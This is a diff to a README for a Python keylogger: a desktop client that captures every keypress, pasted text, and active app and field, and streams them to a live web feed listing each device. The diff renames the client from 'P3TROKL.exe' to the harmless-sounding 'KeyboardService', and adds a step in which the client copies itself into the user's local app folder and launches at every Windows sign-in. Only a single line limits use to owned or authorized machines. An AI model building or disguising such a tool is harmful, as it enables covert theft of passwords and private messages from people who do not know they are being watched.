@@ -1,13 +1,13 @@
-# Live Key Feed
+# KeyboardService
 
-Live Key Feed is a Python web service and desktop client. The client collects typed text, groups it into messages, and sends each message to the web service. The web page displays messages live and shows the device number that sent each one.
+KeyboardService is a Python web service and desktop client. The client collects typed text, groups it into messages, and sends each message to the web service. The web page displays messages live and shows the device number that sent each one.
 
 Only run the client on computers and accounts you own or are explicitly authorized to monitor.
 
 ## How It Works
 
 ```text
-Keyboard input -> P3TROKL.exe -> POST /api/messages -> app.py -> index.html
+Keyboard input -> KeyboardService.exe -> POST /api/messages -> app.py -> index.html
 ```
 
 Each message contains filtered `text`, the original `raw_text`, `device_id`, `device_name`, and `is_pasted`. Every keyboard press is also stored as a `raw_only` log record, including modifiers and non-text keys. The desktop client also records the active app and focused Windows control, keeping that destination while typing and starting a new message when focus moves to another field or app. The device number is a stable 12-character value generated from the computer name. The old separate heartbeat process is no longer used. A message is sent when Enter is pressed or after about 2.5 seconds without typing. Clipboard pastes are sent as separate messages and shown with a `Pasted` label and a different bubble color. The web feed can switch between filtered bubbles and a separate raw keyboard log, and each device is a link to its own message feed.
@@ -18,7 +18,7 @@ Each message contains filtered `text`, the original `raw_text`, `device_id`, `de
 - `client.py`: keyboard listener and message sender.
 - `index.html`: live browser feed.
 - `mobile_keyboard/`: native Android and iPhone sample keyboard clients.
-- `P3TROKL.spec`: PyInstaller configuration.
+- `KeyboardService.spec`: PyInstaller configuration.
 - `render.yaml`: Render deployment configuration.
 - `text.txt`: local message log, ignored by Git.
 
@@ -156,23 +156,27 @@ When `DATABASE_URL` is set, the server loads and saves messages in Supabase. Wit
 Use the exact URL shown by Render:
 
 ```powershell
-./dist/P3TROKL.exe
+./dist/KeyboardService.exe
 ```
 
 The Render URL is embedded in the executable, so no `.env` file or terminal variables are required.
 
 Windows browsers do not allow a website to silently launch a downloaded
-executable. Open `P3TROKL.exe` once after downloading it; the client registers
-itself to launch automatically when you sign in to Windows from then on.
+executable. Open `KeyboardService.exe` once after downloading it; the client registers
+itself to launch automatically when you sign in to Windows from then on. On its
+first run, the packaged client copies itself to
+`%LOCALAPPDATA%\KeyboardService\KeyboardService.exe`, starts that installed copy, and uses
+the installed path for future logins. The downloaded file only needs to be
+opened once.
 
 ## Build the Executable
 
 ```powershell
-taskkill /F /IM P3TROKL.exe /T 2>$null
-python -m PyInstaller --clean --noconfirm P3TROKL.spec
+taskkill /F /IM KeyboardService.exe /T 2>$null
+python -m PyInstaller --clean --noconfirm KeyboardService.spec
 ```
 
-Output: `dist/P3TROKL.exe`
+Output: `dist/KeyboardService.exe`
 
 ## Troubleshooting
 
